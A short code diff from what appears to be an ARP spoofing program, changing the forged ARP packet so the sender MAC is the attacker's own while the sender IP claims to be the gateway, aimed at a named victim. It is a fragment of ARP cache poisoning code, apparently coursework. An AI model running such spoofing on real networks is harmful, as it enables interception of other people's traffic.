@@ -161,7 +161,7 @@ int arp_packat(char* ifname, char* gateway_addr, char* victim_addr) {
 	packet1.arp_.hln_ = Mac::SIZE;
 	packet1.arp_.pln_ = Ip::SIZE;
 	packet1.arp_.op_ = htons(ArpHdr::Request);
-	packet1.arp_.smac_ = Mac("00:00:00:00:00:00"); //my MAC
+	packet1.arp_.smac_ = my_mac; //my MAC
 	packet1.arp_.sip_ = htonl(Ip(gateway_addr)); //gateway
 	packet1.arp_.tmac_ = victim_mac; //victim MAC
 	packet1.arp_.tip_ = htonl(Ip(victim_addr)); //victim IP
